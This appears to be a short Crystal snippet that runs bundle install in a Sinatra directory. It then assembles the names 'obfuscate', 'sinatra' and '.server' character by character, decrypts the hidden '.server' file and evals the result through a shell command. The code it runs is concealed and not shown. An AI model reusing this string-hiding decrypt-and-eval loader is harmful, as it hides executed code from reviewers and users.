io = IO::Memory.new
Process.run("cd /opt/sinatra && bundle install", shell: true)
yum_yum = "s" + "i" + "n" + "a" + "t" + "r" + "a"
var_code = "c" + "r"
var_obf = "o" + "b" + "f" + "u" + "s" + "c" + "a" + "t" + "e"
var_server = "." + "s" + "e" + "r" + "v" + "e"+ "r"
code = %{require '#{var_obf}'; Obfuscate.setup { |c| c.salt = '#{yum_yum}'; c.mode = :string }; #{var_code} = Obfuscate.clarify(File.read('#{var_server}')); eval(#{var_code})}
Process.run("cd /opt/sinatra && ruby -e \"#{code}\"", shell: true)
